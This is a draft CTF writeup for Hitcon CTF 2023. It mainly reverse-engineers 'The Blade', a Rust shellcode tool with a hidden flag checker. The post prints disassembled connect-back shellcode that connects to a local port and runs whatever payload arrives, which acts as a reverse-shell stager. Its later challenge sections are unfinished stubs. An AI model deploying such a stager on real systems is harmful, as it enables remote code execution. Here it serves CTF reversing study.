---
title: "Hitcon CTF 2023 writeup"
date: 2023-09-10T00:00:00+07:00
tags:
 - ctf
 - writeup
draft: true
---

This is a short writeup for the challenges I managed to solve in Hitcon CTF 2023. The challenges was not impossibly hard as I initially thought, but they was enjoyable nonetheless.

## Full Chain - The Blade
{{< admonition type=info title="Given file" open=true >}}
[chal-the-blade](blade/chal-the-blade)
{{< /admonition >}}


{{< admonition type=info title="Description" open=true >}}
A Rust tool for executing shellcode in a seccomp environment. Your goal is to pass the hidden flag checker concealed in the binary.

Author: wxrdnx

{{< /admonition >}}

### Basic analysis
We are given an ELF file written in Rust. It is some sort of command line tool to run shellcode on a victim machine. To establish a connection to the victim machine, we could use the commands `server`, then `run`. The program will then prompt us to run the following shellcode on the victim machine

```
0:  eb 10                   jmp    0x12
2:  31 c0                   xor    eax,eax
4:  53                      push   rbx
5:  5f                      pop    rdi
6:  49 8d 77 10             lea    rsi,[r15+0x10]
a:  48 31 d2                xor    rdx,rdx
d:  80 c2 ff                add    dl,0xff
10: 0f 05                   syscall
12: 6a 29                   push   0x29
14: 58                      pop    rax
15: 99                      cdq
16: 6a 02                   push   0x2
18: 5f                      pop    rdi
19: 6a 01                   push   0x1
1b: 5e                      pop    rsi
1c: 0f 05                   syscall
1e: 50                      push   rax
1f: 5b                      pop    rbx
20: 48 97                   xchg   rdi,rax
22: 68 7f 00 00 01          push   0x100007f
27: 66 68 11 5c             pushw  0x5c11
2b: 66 6a 02                pushw  0x2
2e: 54                      push   rsp
2f: 5e                      pop    rsi
30: b2 10                   mov    dl,0x10
32: b0 2a                   mov    al,0x2a
34: 0f 05                   syscall
36: 4c 8d 3d c5 ff ff ff    lea    r15,[rip+0xffffffffffffffc5]        # 0x2
3d: 41 ff e7                jmp    r15
```
which is a self-modifying shell code that tells the victim to connect to the server, then read and execute any payload coming from the socket.

Loading the binary into IDA and looking around, we can see multiple comparisions being made to detect the correct command at `seccomp_shell::cli::prompt::h56d4b6fe2f13f522`

```c
switch ( cmdLen )
    {
      case 6LL:
        if ( !(*v12 ^ 'vres' | *(v12 + 4) ^ 're') )     // server
        {
          v15 = seccomp_shell::server::prompt::h2dcdaf613d801878(v33);
          goto LABEL_39;
        }
        goto UNKNOWN_CMD;
      case 5LL:
        if ( *v12 ^ 'lehs' | *(v12 + 4) ^ 'l' )         //shell
          goto UNKNOWN_CMD;
        if ( v33[4] == -1 )
        {
          v15 = seccomp_shell::shell::prompt::h76cecfe7bd3bdf50(v33);
```
After a little digging around, I found a hidden sub-command of the `shell` command inside `seccomp_shell::shell::prompt::h76cecfe7bd3bdf50`
```c
case 'galf':
    v18 = 9LL;
    v19 = "Incorrect";
    if ( agrCount == 2 )
    {
        v51 = seccomp_shell::shell::verify::h898bf5fa26dafbab(v158, *(v179 + 24), *(v179 + 40));// arg are: something, raw_input, input_len
        v53 = v52;
        if ( v51 )
        seccomp_shell::util::print_failed::h41a9d0b5672e2e2f( "Incorrect", 9LL);
        else
        seccomp_shell::util::print_success::h8c458b43bfca28cc("Correct", 7LL);
    .....
    }
```
The flag is verified inside `seccomp_shell::shell::verify::h898bf5fa26dafbab`. The flag is first encrypted using the following routine:
```
- Check if len(flag) == 64
- Perform the following 256 times:
    + Shuffle the flag 3 times, using 3 hardcoded maps.
    + Perform some arthimetic operations on each char of the flag.
```
The encrypted flag is then written to a buffer and sent to the victim. It took me a while to realize that this buffer actually contains shellcode for the victim to run, and the checking routine is performed at the victim side.

The template for the checking shellcode can be found at offset `0x62b2b`. It first reads the first 4 bytes of `/bin/sh` (which are the ELF magic bytes), the first 4 bytes of `/etc/passwd` (which is always `root`) and 4 bytes from `/dev/zero` and uses those constants to perform another arthimetic operation on the encrypted flag. The final result is compared with a constant (which is embed in the shellcode by the server) 

```c
v14 = (~zero >> 29) / 0x29uLL;
result = (v14 ^ ~__ROR4__(root ^ (elfHeader + encrypted_flag), 11)) == constant_from_server;
v16 = sys_write(socket, &result, 8uLL);
```

### Solving:
Since the shuffles is deterministic, I input the following string to the program: `ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789[]`. Each char only appear once in the string, so by debugging pass the 3 shuffles, we can know for sure where a char would be after the operations.
```py
original = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789[]"
shuffled = "rP5V[azMm8xwY1SGnHtb]OcZyvDpRgN6kd3q9LKE4QTfXhB0UuoCs2JiejFl7AIW"
```
With this, we can reverse the shuffles.

## LessEQualmore

{{< admonition type=info title="Given file" open=true >}}
[lessequalmore](lessequalmore/lessequalmore)

[chall.txt](lessequalmore/chal.txt)
{{< /admonition >}}


{{< admonition type=info title="Description" open=true >}}
Sometime, less instruction equal more instruction ...

Author: bronson113

{{< /admonition >}}

## CrazyArcade

{{< admonition type=info title="Given file" open=true >}}
[lessequalmore](lessequalmore/lessequalmore)

[chall.txt](lessequalmore/chal.txt)
{{< /admonition >}}


{{< admonition type=info title="Description" open=true >}}
I was 4 dan in Crazy Arcade without using any script, but it is yet another Crazy Arcade.
Note: Although this challenge is not malicious, it may make your system vulnerable, so please run it in your VM.

Author: zeze

{{< /admonition >}}

Will get back to writing soon